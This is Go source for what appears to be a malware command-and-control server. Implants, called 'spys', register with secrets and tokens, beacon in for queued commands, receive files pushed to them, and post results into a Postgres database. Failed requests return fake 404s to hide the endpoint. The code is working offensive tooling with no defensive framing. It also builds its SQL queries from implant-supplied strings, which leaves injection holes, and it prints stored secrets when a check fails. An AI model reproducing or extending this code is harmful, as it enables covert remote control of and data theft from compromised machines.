package main

import (
	"bufio"
	"database/sql"
	b64 "encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	_ "github.com/lib/pq"
	"gopkg.in/yaml.v2"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

// Database connection
var db *sql.DB

// Configuration file
var cfg Config

// Configuration file struct
type Config struct {
	Server struct {
		Ip	string `yaml:"ip"`
		Port 	string `yaml:"port"`
		Uri 	string `yaml:"uri"`
		Secret 	string `yaml:"secret"`
		In	string `yaml:"in"`
		Out	string `yaml:"out"`
	} `yaml:"server"`
	Database struct {
		Dbhost 	string `yaml:"host"`
		Dbport 	int	  `yaml:"port"`
		Dbuser 	string `yaml:"user"`
		Dbpass 	string `yaml:"pass"`
		Dbname 	string `yaml:"name"`
		Dbmode 	string `yaml:"mode"`
	} `yaml:"database"`
}

// Spy task object
type SpyIdentity struct {
	Id 		int 	`db:"id"`
	Targ 		string 	`db:"targ"`
	Arch 		string 	`db:"arch"`
	Os 		string 	`db:"os"`
	Secret          string  `db:"secret"`
	Calls   	int	`db:"calls"`
	Ring          	int   	`db:"ring"`
	FirstSeen 	int64 	`db:"firstSeen"`
	LastSeen 	int64 	`db:"lastSeen"`
}

// Spy task object
type SpyTask struct {
	Id 		int 	`db:"id"`
	Targ 		string 	`db:"targ"`
	Job             int     `db:"job"`
	Command 	string 	`db:"command"`
	Status 		string 	`db:"status"`
	TaskDate 	int64 	`db:"taskDate"`
	CompleteDate 	int64 	`db:"completeDate"`
	Complete 	bool 	`db:"complete"`
}

// Validate spy token struct
type SpyToken struct {
	Targ 	string `db:"targ"`
	Secret 	string `db:"secret"`
	Token  	string `db:"token"`
}

// Spy
type Spy struct {
	Targ 	string `json:"targ"`
	Secret 	string `json:"secret"`
	Job     string `json:"job"`
	Results	[]Result
}

// Spy struct for posting results
type Result struct {
	Targ   string `json:"targ"`
	JobId  int    `json:"jobId"`
	Output string `json:"output"`
}

// Spy struct for tasks
type Task struct {
	Id 	int 	`json:"id"`
	Command string 	`json:"command"`
}

type TaskList struct {
	SpyTasking []Task
}

func main() {
	// Required: server and database configuration file
	var config = flag.String("c", "config.yml", "Configuration file")
	flag.Parse()

	// Parse the configuration file
	initServer(*config)

	// Start the server
	StartServer(cfg.Server.Ip, cfg.Server.Port, cfg.Server.Uri)
}

func initServer(c string) {

	// Read server configuration
	f, err := os.Open(c)
	if err != nil {
		fmt.Println("[!] Missing configuration file.")
		os.Exit(3)
	}
	defer f.Close()

	decoder := yaml.NewDecoder(f)
	err = decoder.Decode(&cfg)
	if err != nil {
		fmt.Println("[!] Error reading configuration file.")
		os.Exit(3)
	}

	// Connect to database
	connect()

	// Create db schema if not exist
	CreateSchemas()

	// Get working path and make directories
	working := getWorkingDirectory()
	makeDirectories(working)
}

func StartServer(ip string, port string, uri string) {

	mux := http.NewServeMux()
	mux.HandleFunc(uri, taskHandler)

	// server configuration
	s := fmt.Sprintf("%s:%s", ip, port)
	server := &http.Server{
		Addr: s,
		Handler: mux,
		ReadTimeout: 10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	d := fmt.Sprintf("\n[+] Go Backend: { Server Listening on %s:%s}\n[+] Server started", ip, port)
	log.Printf(d)

	// Start Server
	log.Fatal(server.ListenAndServe())
}

func taskHandler(w http.ResponseWriter, req *http.Request) {

	if req.Method != "POST" {
		http.Error(w, "page not found", 404)
		return
	}

	// Instantiate Spy
	var a Spy

	// Parse JSON spy body
	decoder := json.NewDecoder(req.Body)
	err := decoder.Decode(&a)
	if err != nil {
		http.Error(w, "page not found", 404)
		return
	}

	aExists := spyExist(a.Targ)
	if aExists {
		x := GetSpy(a.Targ)

		if x.Secret != a.Secret {
			http.Error(w, "page not found", 404)
			return
		}

		if a.Job == "reboot" || a.Job == "dial" {
			if a.Job == "reboot" {
				err := AddRebootTask(a.Targ)
				if err != nil {
					http.Error(w, err.Error(), 404)
					return
				}
				fmt.Println("[*] Reboot settings requested from ", a.Targ)
			} else {
				fmt.Println("[*] Observed dial from", a.Targ)
			}

			// Update the spy check in time
			UpdateSpyStatus(a.Targ)

			// Query spy tasks based on targ
			t := TaskList{}
			err := GetSpyJobs(a.Targ, &t)
			if err != nil {
				http.Error(w, err.Error(), 404)
				return
			}

			// Check for tasks, if none return 404
			if len(t.SpyTasking) < 1 {
				http.Error(w, "page not found", 404)
				return
			}

			// Tasks to json
			out, err := json.Marshal(t)
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}

			_,_ = fmt.Fprint(w, string(out))
		} else if a.Job == "post" {
			if len(a.Results) > 0 {
				fmt.Println("[*] Receiving data from", a.Targ)
			}
			for i := 0; i < len(a.Results); i++ {
				UpdateSpyJobs(a.Results[i].JobId, strings.TrimSpace(a.Results[i].Output), a.Targ)
			}
		} else {
			http.Error(w, "page not found", 404)
			return
		}
	} else if a.Targ != "" && a.Secret != "" && a.Job != "" {
		if a.Job == "dial" {
			token := generateRandomString()
			cmd := fmt.Sprintf("update %s", token)
			AddToken(a.Targ, a.Secret, token)

			// Create a single task
			tList := TaskList{}
			t := Task{}
			t.Id = 0
			t.Command = cmd
			tList.SpyTasking = append(tList.SpyTasking, t)

			// Create JSON task
			out, err := json.Marshal(tList)

			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}

			fmt.Println("[+] New spy check in from", a.Targ)

			_,_ = fmt.Fprint(w, string(out))
		} else if a.Job == "update" {

			t := strings.TrimSpace(a.Results[0].Output)
			c := strings.Split(t, ",")
			x := GetToken(a.Targ, a.Secret, strings.TrimSpace(c[0]))

			if x {
				// Add the new spy to the db
				w, _ := strconv.Atoi(strings.TrimSpace(c[5]))
				z, _ := strconv.Atoi(strings.TrimSpace(c[6]))
				AddNewSpy(strings.TrimSpace(c[1]), strings.TrimSpace(c[2]), strings.TrimSpace(c[3]),
					strings.TrimSpace(c[4]), w, z)

				fmt.Println("[+] New spy dial from", a.Targ)
			} else {
				http.Error(w, "page not found", 404)
				return
			}
		} else {
			http.Error(w, "page not found", 404)
			return
		}
	} else {
		http.Error(w, "page not found", 404)
		return
	}
}

// Error function
func processError(err error) {
	fmt.Println(err)
	os.Exit(2)
}

func b64Encode(s string) string {
	return b64.StdEncoding.EncodeToString([]byte(s))
}

func b64Decode(s string) string {
	x,_ := b64.StdEncoding.DecodeString(s)
	return string(x)
}

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
	length := 12
	var b strings.Builder
	for i := 0; i < length; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	return b.String()
}

func CreateDirIfNotExist(dir string) {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		err = os.MkdirAll(dir, 0755)
		if err != nil {
			processError(err)
		}
	}
}

func getWorkingDirectory() string {
	// Get working directory
	path, err := os.Getwd()
	if err != nil {
		processError(err)
	}
	return path
}

func makeDirectories(path string) {
	// Create inbox and outbox paths
	outPath := fmt.Sprintf("%s/%s", path, cfg.Server.In)
	inPath := fmt.Sprintf("%s/%s", path, cfg.Server.Out)
	CreateDirIfNotExist(outPath)
	CreateDirIfNotExist(inPath)
}


// Connect to postgres database
func connect() {
	connectionString := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=%s sslmode=%s",
		cfg.Database.Dbhost, cfg.Database.Dbport, cfg.Database.Dbuser, cfg.Database.Dbpass, cfg.Database.Dbname,
		cfg.Database.Dbmode)

	var err error
	db, err = sql.Open("postgres", connectionString)
	if err != nil {
		processError(err)
	}

	err = db.Ping()
	if err != nil {
		processError(err)
	}
}

// Execute postgres commands
func exec(command string) {
	_, err := db.Exec(command)
	if err != nil {
		processError(err)
	}
}

// Get current epoch time
func GetCurrentEpoch() int64 {
	return time.Now().Unix()
}

func readFile(s string) string {
	if _, err := os.Stat(s); err == nil {
		f, err := os.Open(s)
		if err != nil {
			return b64Encode(err.Error())
		} else {
			reader := bufio.NewReader(f)
			content, _ := ioutil.ReadAll(reader)
			return b64.StdEncoding.EncodeToString(content)
		}
	} else {
		return "Error"
	}
}

// Add spy to Postgres
func AddNewSpy(a string, s string, ar string, o string, c int, j int) {
	t := "INSERT INTO spys (targ,arch,os,secret,calls,ring,firstSeen,lastSeen) VALUES ('%s', '%s', '%s', '%s', %d, %d, %d, %d)"
	command := fmt.Sprintf(t, a, ar, o, s, c, j, GetCurrentEpoch(), GetCurrentEpoch())
	exec(command)
	fmt.Printf("[+] New spy checked in: %s\n", a)
}

// Get spy tasks
func GetSpyJobs(n string, tList *TaskList) error {
	q := "SELECT job,command FROM tasks WHERE targ='%s' AND complete=false AND status='Fired' ORDER BY taskDate ASC"
	command := fmt.Sprintf(q, n)
	rows, err := db.Query(command)

	if err != nil {
		processError(err)
	}

	defer rows.Close()
	for rows.Next() {
		t := Task{}
		err = rows.Scan(&t.Id, &t.Command)
		if err != nil {
			return err
		}
		c := strings.Split(t.Command, " ")
		if c[0] == "push" {
			x := fmt.Sprintf("%s %s %s", c[0], readFile(c[1]), c[2])
			t.Command = x
		}
		UpdateSpyJobStatus(t.Id)
		tList.SpyTasking = append(tList.SpyTasking, t)
	}

	err = rows.Err()
	if err != nil {
		return err
	}
	return nil
}

// Get spyt tasks
func AddRebootTask(n string) error {
	q := "SELECT calls,ring FROM spys WHERE targ='%s' LIMIT 1"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	j := []string{"calls", "ring"}

	var a SpyIdentity
	switch err := row.Scan(&a.Calls, &a.Ring); err  {
	case sql.ErrNoRows:
		return err
	case nil:
		for _, s := range j {
			at := SpyTask{}
			at.Targ = n
			at.Status = "Fired"
			at.TaskDate = GetCurrentEpoch()
			at.CompleteDate = 0
			at.Complete = false

			if s == "calls" {
				// Make command string
				x := fmt.Sprintf("set calls %d", a.Calls)
				at.Command = x
			} else {
				x := fmt.Sprintf("set ring %d", a.Ring)
				at.Command = x
			}
			AddSpyTask(at)
		}
		return  nil
	default:
		return err
	}
}

// Add task to Postgres
func AddSpyTask(a SpyTask) {
	t := "INSERT INTO tasks (targ, command, status, taskDate, completeDate, complete) VALUES ('%s', '%s', '%s', %d, %d, %t);"
	command := fmt.Sprintf(t, a.Targ, a.Command, a.Status, a.TaskDate, a.CompleteDate, a.Complete)
	exec(command)
}

func spyExist(n string) bool {
	q := "SELECT id,targ,secret FROM spys WHERE targ='%s'"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var a SpyIdentity
	switch err := row.Scan(&a.Id, &a.Targ, &a.Secret); err  {
	case sql.ErrNoRows:
		return false
	case nil:
		return true
	default:
		return false
	}
}

func GetSpy(n string) SpyIdentity {
	q := "SELECT id,targ,secret FROM spys WHERE targ='%s'"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var a SpyIdentity
	switch err := row.Scan(&a.Id, &a.Targ, &a.Secret); err  {
	case sql.ErrNoRows:
		a.Secret = ""
		return a
	case nil:
		return a
	default:
		a.Secret = ""
		return a
	}
}

func UpdateSpyStatus(n string) {
	u := "UPDATE spys SET lastSeen = %d WHERE targ = '%s'"
	c := fmt.Sprintf(u, GetCurrentEpoch(), n)
	exec(c)
}

func UpdateSpyJobStatus(i int) {
	u := "UPDATE tasks SET status = 'Sent' WHERE job = %d"
	c := fmt.Sprintf(u, i)
	exec(c)
}

// Get spy tasks
func UpdateSpyJobs(i int, s string, n string) {
	u := "UPDATE tasks SET status = 'Complete', completeDate = %d, complete = true WHERE job = %d"
	c1 := fmt.Sprintf(u,GetCurrentEpoch(),i)
	exec(c1)

	j := "INSERT INTO results (targ,jobId,output,completeDate) VALUES ('%s', %d, '%s', %d)"
	c2 := fmt.Sprintf(j, n, i, s, GetCurrentEpoch())
	exec(c2)
}

// Add spy token
func AddToken(n string, s string, t string) {
	u := "INSERT INTO tokens (targ,secret,token) VALUES ('%s','%s','%s')"
	c := fmt.Sprintf(u, n, s, t)
	exec(c)
}

// Add spy token
func GetToken(n string, s string, t string) bool {
	q := "SELECT targ,secret,token FROM tokens WHERE targ='%s'"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var a SpyToken
	switch err := row.Scan(&a.Targ, &a.Secret, &a.Token); err  {
	case sql.ErrNoRows:
		return false
	case nil:
		if s == a.Secret && t == a.Token {
			return true
		} else {
			fmt.Println(a.Secret)
			return false
		}
	default:
		return false
	}
}

// Create schemas
func CreateSchemas() {
	createSpySchema()
	createTaskSchema()
	createResultSchema()
	createTokenSchema()
	createUserSchema()
}

// Create Postgres database schema for spys
func createSpySchema() {
	spySchema := `
        CREATE TABLE IF NOT EXISTS spys (
          id SERIAL PRIMARY KEY,
          targ TEXT UNIQUE,
          arch TEXT,
          os TEXT,
          secret TEXT,
          calls INTEGER,
          ring INTEGER,
          firstSeen INTEGER,
          lastSeen INTEGER
        );
    `
	exec(spySchema)
}

// Create Postgres database schema for tasks
func createTaskSchema() {
	taskSchema := `
        CREATE TABLE IF NOT EXISTS tasks (
          id SERIAL PRIMARY KEY,
          targ TEXT,
   	      job SERIAL UNIQUE,
          command TEXT,
          status TEXT,
          taskDate INTEGER,
          completeDate INTEGER,
          complete BOOLEAN
        );
    `
	exec(taskSchema)
}

// Create Postgres database schema for results
func createResultSchema() {
	resultSchema := `
        CREATE TABLE IF NOT EXISTS results (
          id SERIAL PRIMARY KEY,
          targ TEXT,
          jobId INTEGER,
          output TEXT,
          completeDate INTEGER
        );
    `
	exec(resultSchema)
}

// Create Postgres database schema for results
func createTokenSchema() {
	tokenSchema := `
        CREATE TABLE IF NOT EXISTS tokens (
          id SERIAL PRIMARY KEY,
          targ TEXT UNIQUE,
          secret TEXT,
          token TEXT
        );
    `
	exec(tokenSchema)
}

// Create postgres database schema for monitor users
func createUserSchema() {
	userSchema := `
		CREATE TABLE IF NOT EXISTS users (
			id SERIAL PRIMARY KEY,
			username VARCHAR(20) UNIQUE NOT NULL,
			password VARCHAR(60) NOT NULL
		);
	`
	exec(userSchema)
}